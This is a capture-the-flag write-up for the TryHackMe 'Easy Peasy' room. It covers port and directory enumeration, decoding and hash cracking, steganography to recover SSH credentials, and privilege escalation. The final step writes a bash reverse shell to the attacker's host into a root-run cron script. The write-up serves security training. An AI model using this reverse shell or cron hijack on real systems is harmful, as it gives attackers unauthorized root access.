# [Easy Peasy](https://tryhackme.com/room/easypeasyctf)

---

Title: Easy Peasy
Description: A room with enumeration, directory brute force and hash breaking
Tags: rot13, base64, john, curl

---

## Attack Narative

### A. Enumeration through Nmap 

```bash
clobee@kali:~/tmp/easypeasy$ nmap -sC -sV -A -p- -oN nmap/initial 10.10.69.49

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 17:32 GMT
Nmap scan report for 10.10.69.49
Host is up (0.040s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.69 seconds
```

#### A.1 How many ports are open?

```
3
```

#### A.2 What is the version of nginx?

```
nginx/1.16.1
```

#### A.3 What is running on the highest port?

```
Apache/2.4.43 (Ubuntu)
```
---

### B. Compromising the machine

#### B.1 Using GoBuster, find flag 1.

We conducted a quick directory scan using gobuster

```bash
clobee@kali:~/tmp/easypeasy$ gobuster dir -u http://10.10.69.49 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.69.49
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/03 17:43:50 Starting gobuster
===============================================================
/hidden (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
===============================================================
2021/01/03 17:44:03 Finished
===============================================================
```

We found an interestinge folder `/hidden`

```bash
clobee@kali:~/tmp/easypeasy$ curl http://10.10.69.49/hidden/ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'

<!DOCTYPE html>
<html>
<head>
<title>Welcome to ctf!</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2016/12/24/11/48/lost-places-1928727_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
</body>
</html>
```

More enumeration revealed another folder

```bash
clobee@kali:~/tmp/easypeasy$ gobuster dir -u http://10.10.69.49/hidden -w /usr/share/wordlists/dirb/common.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.69.49/hidden
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/03 18:15:58 Starting gobuster
===============================================================
/index.html (Status: 200)
/whatever (Status: 301)
===============================================================
2021/01/03 18:16:10 Finished

```

Which revealed 

```bash
clobee@kali:~/tmp/easypeasy$ curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" http://10.10.69.49/hidden/whatever/index.html

<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```

Here is the first flag

```bash
clobee@kali:~/tmp/easypeasy$ echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
```

#### B.2 Further enumerate the machine, what is flag 2?

Doing more enumeration of the target machine we notice the following information

```bash
clobee@kali:~/tmp/easypeasy$ curl http://10.10.69.49:65524/robots.txt

User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

The user-agent revealled a flag while using https://md5hashing.net/


#### B.3 Crack the hash with easypeasy.txt, What is the flag 3?

Using the new user-agent (we previsously encover) we were able to retrieve a flag

```bash
clobee@kali:~/tmp/easypeasy$ curl http://10.10.69.49:65524/ -H "User-Agent: a18672860d0510e5ab6699730763b250" | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0          <a href="#flag">hi</a>
100 10818  100 10818    0     0   215k      0 --:--:-- --:--:-- -                           Fl4g 3 : flag{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
-:--:--  215k

```

#### B.4 What is the hidden directory?

Looking at the source code of the main page on port 65524 we noticed an hidden html code.
The code gave us an hint on the encoding used.

The encoding base-62 in cyberchef revealed the encoded information (a directory)

```bash
clobee@kali:~/tmp/easypeasy$ curl http://10.10.69.49:65524/

    <div class="main_page">
      <div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>

      ...

```

#### B.5 Using the wordlist that provided to you in this task crack the hash

what is the password?

```bash
clobee@kali:~/tmp/easypeasy$ curl http://10.10.69.49:65524/[SOME_DIRECTORY]/index.html

<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;


	}
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```

```bash
clobee@kali:~/tmp/easypeasy$ echo '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81' > hash

clobee@kali:~/tmp/easypeasy$ john --wordlist=easypeasy.txt --format=gost hash
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
No password hashes left to crack (see FAQ)

clobee@kali:~/tmp/easypeasy$ john hash --show
?:XXXXXXXXXXXXXXXXXXXXXXX

1 password hash cracked, 0 left
```

#### B.6 What is the password to login to the machine via SSH?

```bash
clobee@kali:~/tmp/easypeasy$ wget http://10.10.69.49:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg

--2021-01-03 19:52:31--  http://10.10.69.49:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
Connecting to 10.10.69.49:65524... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90158 (88K) [image/jpeg]
Saving to: ‘binarycodepixabay.jpg’

binarycodepixabay.jpg         100%[===============================================>]  88.04K  --.-KB/s    in 0.08s   

2021-01-03 19:52:32 (1.11 MB/s) - ‘binarycodepixabay.jpg’ saved [90158/90158]
```

```bash
clobee@kali:~/tmp/easypeasy$ steghide info binarycodepixabay.jpg

"binarycodepixabay.jpg":
  format: jpeg
  capacity: 4.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secrettext.txt":
    size: 278.0 Byte
    encrypted: no
    compressed: no
```

```bash
clobee@kali:~/tmp/easypeasy$ steghide extract -sf binarycodepixabay.jpg

Enter passphrase: 
wrote extracted data to "secrettext.txt".

clobee@kali:~/tmp/easypeasy$ batcat secrettext.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: secrettext.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ username:boring
   2   │ password: [SOME_BINARY]
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Using the filter "from binary" in Cyberchef we were able to get the password `iconvertedmypasswordtobinary`

```bash
clobee@kali:~/tmp/easypeasy$ sshpass -p 'xxxxxxxxx' ssh boring@10.10.69.49 -p 6498

*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized	       **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ 
```

#### B.7 What is the user flag?

```bash
boring@kral4-PC:~$ cat /home/boring/user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```
The message in the user.txt gave us an indication that it was encoded with ROT13.

```bash
clobee@kali:~/tmp/easypeasy$ echo "synt{a0jvgf33zfa0ez4y}"  |tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
```

#### B.8 What is the root flag?

```bash
boring@kral4-PC:~$ ls -ail /var/www/
total 16
139446 drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
130564 drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
139447 drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
138531 -rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
```

```bash
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
#!/bin/bash
# i will run as root
```

```bash
boring@kral4-PC:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

We modified the cron script `.mysecretcronjob.sh` to create a reverse shell on our attack box

```bash
boring@kral4-PC:~$ nano /var/www/.mysecretcronjob.sh

boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh
bash -i &>/dev/tcp/10.11.21.99/4444 <&1
# i will run as root
boring@kral4-PC:~$ 
```

Which gave us root access

```bash
clobee@kali:~/tmp/easypeasy$ nc -nvlp 4444

Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.69.49.
Ncat: Connection from 10.10.69.49:52936.
bash: cannot set terminal process group (2160): Inappropriate ioctl for device
bash: no job control in this shell

root@kral4-PC:/var/www# cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: No such file or directory

root@kral4-PC:/var/www# ls -ail /root
ls -ail /root
total 40
130578 drwx------  5 root root 4096 Jun 15  2020 .
     2 drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
130663 -rw-------  1 root root    2 Jan  3 12:36 .bash_history
138764 -rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
138763 drwx------  2 root root 4096 Jun 13  2020 .cache
132672 drwx------  3 root root 4096 Jun 13  2020 .gnupg
130659 drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
138765 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
138218 -rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
138546 -rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor

root@kral4-PC:/var/www# cat /root/.root.txt
cat /root/.root.txt
```
